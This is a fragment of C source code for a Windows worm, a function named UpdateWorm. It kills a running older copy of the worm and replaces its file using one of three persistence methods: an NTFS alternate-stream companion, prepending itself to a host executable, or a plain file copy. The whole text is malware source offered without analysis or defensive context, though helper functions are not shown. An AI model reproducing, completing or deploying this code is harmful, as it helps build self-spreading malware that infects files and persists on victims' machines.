   bool UpdateWorm(char CurrentVersion[])
   {
       char    Version[MAX_PATH] = "";
       char    FullPath[MAX_PATH] = "";
       char    AutostartMethod[MAX_PATH] = "";
       char    TempPath[MAX_PATH];

       if(GetVersion(Version, FullPath, AutostartMethod) == true)
       {
           if(lstrcmp(Version, CurrentVersion) != 0)
           {
               if(TerminateWormProcess() == true)
               {
                   if(lstrcmp(AutostartMethod, "NTFS") == 0)
                   {
                       lstrcpy(TempPath, FullPath);
                       lstrcat(TempPath, ".DiA");

                       if(CopyFile(TempPath, FullPath, 0) != 0)
                       {
                           if(StreamCompanion(FullPath) == true) return true;
                       }
                       else return false;
                   }

                   if(lstrcmp(AutostartMethod, "Prepend") == 0)
                   {
                       lstrcpy(TempPath, FullPath);
                       lstrcpy(TempPath + lstrlen(TempPath) - 3, "sys");

                       if(CopyFile(TempPath, FullPath, 0) != 0)
                       {
                           if(Prepend(FullPath) == true) return true;
                       }
                       else return false;
                   }

                   if(lstrcmp(AutostartMethod, "Regular") == 0)
                   {
                       if(GetModuleFileName(0, TempPath, sizeof(TempPath)) != 0)
                       {
                           if(CopyFile(TempPath, FullPath, 0) != 0) return true;
                           else return false;
                       }
                   }
               }
           }
       }

       return false;
   }
